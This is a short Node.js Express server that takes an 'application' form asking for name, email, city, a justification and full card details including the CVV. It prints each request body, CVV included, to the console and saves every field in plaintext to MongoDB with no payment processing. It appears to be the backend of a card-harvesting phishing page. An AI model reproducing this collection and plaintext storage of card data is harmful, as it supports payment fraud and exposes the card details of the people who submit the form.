require('dotenv').config();
const express = require('express');
const mongoose = require('mongoose');
const path = require('path');
const cors = require('cors');
const Submission = require('./models/Submission');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// Connect to MongoDB
mongoose.connect(process.env.MONGODB_URI)
    .then(() => console.log('✅ Connected to MongoDB'))
    .catch(err => console.error('❌ MongoDB connection error:', err));

// API to receive application
app.post('/submit-application', async (req, res) => {
    console.log('=== Received submission ===');
    console.log('Request body:', req.body);

    const { name, email, justification, cardName, cardNumber, expiryDate, cvv, city } = req.body;

    // Simple validation
    if (!name || !email || !justification || !cardName || !cardNumber || !expiryDate || !cvv || !city) {
        console.log('Validation failed - missing fields');
        return res.status(400).json({ success: false, message: 'All fields are required.' });
    }

    try {
        // Save to MongoDB
        const submission = new Submission({
            name,
            email,
            city,
            justification,
            cardName,
            cardNumber,
            expiryDate,
            cvv
        });

        await submission.save();
        console.log('✅ Data saved to MongoDB successfully!');

        res.json({ success: true, message: 'Application received. We will contact you shortly.' });
    } catch (error) {
        console.error('❌ Error saving to MongoDB:', error);
        res.status(500).json({ success: false, message: 'Internal Server Error' });
    }
});

// Serve the main page
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, () => {
    console.log(`🚀 Server running at http://localhost:${PORT}`);
});
